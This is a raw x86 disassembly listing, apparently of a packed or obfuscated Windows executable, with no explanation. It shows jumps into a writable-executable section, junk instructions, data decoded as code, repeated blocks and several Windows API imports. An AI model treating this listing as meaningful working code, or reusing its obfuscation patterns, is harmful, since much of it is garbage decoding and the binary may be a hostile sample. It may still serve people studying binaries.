xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
btc ax 0x1
aaa
mov esi edi
arpl [ eax + eax + 0x66 ] si
adc esi edx
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_516afc
push [ esp ]
adc al al
call sub_4cfe49
add [ eax ] al
inc ebx
insb
outsd
jae rwxdata
cmp [ esp ] 0x5336af79
dec eax
popad
outsb
insb
add [ gs : eax ] al
add [ edx + 0x65 ] dl
push ecx
jne rwxdata
lodsd [ esi ]
push cs
leave
in al 0x69
cmpsb [ esi ] [ edi ]
pop esi
std
xchg [ edi - 0x1f3d6bc3 ] bh
xchg edi eax
movsd [ edi ] [ esi ]
loop rwxdata
jpo rwxdata
mov edx 0x446470d1
jb rwxdata
and al 0x81
xor [ edi ] al
dec edx
popfd
rcr [ edx - 0x4613762f ] 0xd9
scasd [ edi ]

outsb
out 0xf3 al
mov al [ 0x3511d8a ]
pushfd
mov dh 0x78
loope rwxdata
mov bl [ 0xffffffffb69c0351 ]
js rwxdata
dec eax
call 0xffffffffd20b8c2c
jo rwxdata
dec eax
iretd
push 0xffffffe0
pop es
dec edi
push eax
xchg dl ch
jpo rwxdata
dec ecx
outsb
outsw
dec ebx
jns rwxdata
daa
lea esp [ eax ]
mov esi 0xaa26ab06
adc [ ebx + edx * 8 ] dl
cli
nop
mov esp 0xdb239156
stosb [ edi ]
fild [ eax - 0x19 ]
push ebp
cmc
and al 0x7d
push es
inc ebx
adc bh [ eax - 0x691d41ce ]
jb rwxdata
inc esp
loope rwxdata
sub al 0x0
mov dh [ edi - 0x14 ]
push edx
sbb bl [ edx + 0x33 ]
mov ecx 0x643c81f2
jns rwxdata
add [ ebp + 0x3575e9f6 ] al
cli
aas
jpe rwxdata
push ebx
and al [ ebp - 0x73ea242d ]
dec esi
sar [ edi - 0x25 ] 0x43
shl [ ecx + 0x28 ] 0x1
mov al 0x7b
fimul [ eax + 0x11 ]
push esp
clc
inc ebp
les esi [ eax + 0x64 ]
inc esp
out dx al
loop rwxdata
pop esp
mov edi [ esp + ecx * 4 ]
xor ah [ ss : edx ]
add dh [ eax + 0x2d ]
salc
mov edi 0x8ed492c6
fdiv [ ebx + 0x2c398bec ]
movsd [ edi ] [ esi ]
jge 0x35ded234
push ebp
out 0x6e eax
fld [ ebp + 0x1f420bb4 ]
jecxz rwxdata
mov ebp 0xb31087e2
aaa
lodsb [ esi ]
loope rwxdata
fdiv [ ebp - 0x55237339 ]
in eax dx
mov [ 0x906fcd ] eax
add [ ebp + 0x6f ] cl
jne rwxdata
std
lodsb [ esi ]
sbb dh dh
sub [ ecx ] dl
push ecx
push ebx
int 0xf9
xor [ ecx - 0x31 ] ch
pop ds
std
mov ebp 0xb560d125
xor [ ebp + 0x765acf1a ] dh
jno rwxdata
mov eax 0x5116b220
pushad
cmp eax 0x73593c7a
pop es
xor esi [ gs : edx ]
inc esi
imul esi [ edx + 0x73 ] 0x74
jo __import_name_3(ADVAPI32:RegCloseKey)
xchg edx eax
mov esp 0xd9b173f4
pop edx
test eax 0xdbd38522
adc eax 0x7fc04e8c
fild [ ebx - 0x2f ]
jno rwxdata
cmp eax [ ebx ]
sub al 0x99
dec ebx
jns rwxdata
push edx
inc ebx
xchg esi ecx
push ecx
shr [ ebx - 0xa ] 0x1
cmc
sub [ ebx + 0x65 ] bl
insd
lodsd [ esi ]
stosd [ edi ]
loop rwxdata
dec edi
or edi [ esi + 0x4a ]
mov ebx 0x120b9f01
aam 0x2f
les esp [ ebx - 0x21 ]
jl rwxdata
jo rwxdata
insb
outsd
jae rwxdata
add [ edx + 0x65 ] dl
inc ebx
dec edx
xor dh [ edi ]
dec edx
sbb [ eax + 0x13c7a3d ] ebp
add ebx [ edi + 0x2c040e52 ]
cdq
sub eax 0xa61f52b3
cmp ah [ esi - 0x4dce7cf4 ]
sub al 0x9b
add eax 0xa612259
push esi
pop edi
imul [ r-xdata ]
cmpsd [ esi ] [ edi ]
cmc
insd
add [ edi + 0x20 ] esi
outsb
sbb eax 0x3266305f
xchg [ edi ] ebx
in al 0x9d
mov eax 0x1bec7cf8
cmp eax 0x5a073c7a
and [ 0xffffffffcc992c04 ] edx
ror [ edi + 0x1a58d747 ] cl
mov dh 0x8
sub_516d74
pushfd
stosb [ edi ]
mov [ esp ] 0xd1
mov [ esp ] cl
lea esp [ esp + 0x8 ]
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jmp rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
